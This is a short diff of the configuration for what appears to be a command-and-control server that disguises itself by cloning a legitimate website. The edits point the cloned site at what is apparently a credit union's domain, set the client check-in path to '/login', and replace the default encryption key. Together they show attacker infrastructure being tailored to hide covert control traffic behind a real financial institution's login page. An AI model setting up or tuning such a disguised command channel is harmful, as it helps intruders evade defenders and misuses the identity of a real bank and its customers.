@@ -13,14 +13,14 @@ via a query string parameter.
 """
 
 # CONFIG CONSTANTS:
-URL = ("https://www.google.com")  # URL to clone to house a legitimate website
+URL = ("https://www.afcu.org")  # URL to clone to house a legitimate website
 USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
 
 # THIS IS WHAT PATH WE WANT TO HIT FOR CODE - THIS CAN BE WHATEVER PATH YOU WANT
 ROOT_PATH_QUERY = ("/")
 
 # THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
-SITE_PATH_QUERY = ("/images")
+SITE_PATH_QUERY = ("/login")
 
 # THIS IS THE QUERY STRING PARAMETER USED
 QUERY_STRING = ("guid=")
@@ -39,7 +39,7 @@ SSL = False
 CERT_FILE = ("")  # Your Certificate for SSL
 
 # THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
-CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
+CIPHER = ("Yd4gRhiAx@nd1s@w350m3#StillrForget")
 
 # Response for website when browsing directories that do not exist if directly going to SITE_PATH_QUERY
 NOTFOUND=("Page not found.")
